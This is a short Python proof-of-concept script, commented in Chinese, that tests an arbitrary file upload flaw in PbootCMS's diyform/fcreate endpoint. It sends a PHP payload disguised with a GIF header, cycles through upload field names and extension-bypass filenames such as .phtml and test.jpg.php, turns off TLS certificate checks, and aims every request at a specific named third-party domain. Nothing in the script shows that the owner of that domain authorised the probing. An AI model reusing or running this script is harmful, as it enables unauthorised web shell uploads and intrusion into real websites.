#!/usr/bin/env python3
"""pboot_upload_poc.py - PbootCMS diyform/fcreate 任意文件上传测试
POST multipart到 /diyform/fcreate, 字段名用常见的(file/upfile/upload)
"""
import urllib.request, urllib.parse, ssl, re, sys, io, uuid

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

BOUNDARY = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
SHELL = b'GIF89a<?php echo "PBTEST_OK";?>'

def make_multipart(field_name, filename, content):
    parts = []
    parts.append('--%s\r\n' % BOUNDARY)
    parts.append('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (field_name, filename))
    parts.append('Content-Type: image/gif\r\n\r\n')
    body = ''.join(parts).encode() + content + b'\r\n'
    body += ('--%s--\r\n' % BOUNDARY).encode()
    return body

def test_upload(dom, field_name, filename):
    url = 'http://' + dom + '/diyform/fcreate'
    body = make_multipart(field_name, filename, SHELL)
    headers = {**UA, 'Content-Type': 'multipart/form-data; boundary=' + BOUNDARY,
               'Referer': 'http://' + dom + '/'}
    req = urllib.request.Request(url, data=body, headers=headers)
    try:
        r = urllib.request.urlopen(req, timeout=20, context=ctx)
        return r.status, r.read(20000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(20000).decode('utf-8', 'ignore')
    except Exception as e:
        return 0, repr(e)[:100]

for field in ['file', 'upfile', 'upload', 'file1', 'files', 'Filedata']:
    for fname in ['test.php', 'test.phtml', 'test.php5', 'test.jpg.php', 'test.php.jpg']:
        st, resp = test_upload('ahbill.com', field, fname)
        print('%s/%s: st=%d resp=%s' % (field, fname, st, resp[:100].replace(chr(10), ' ')), flush=True)
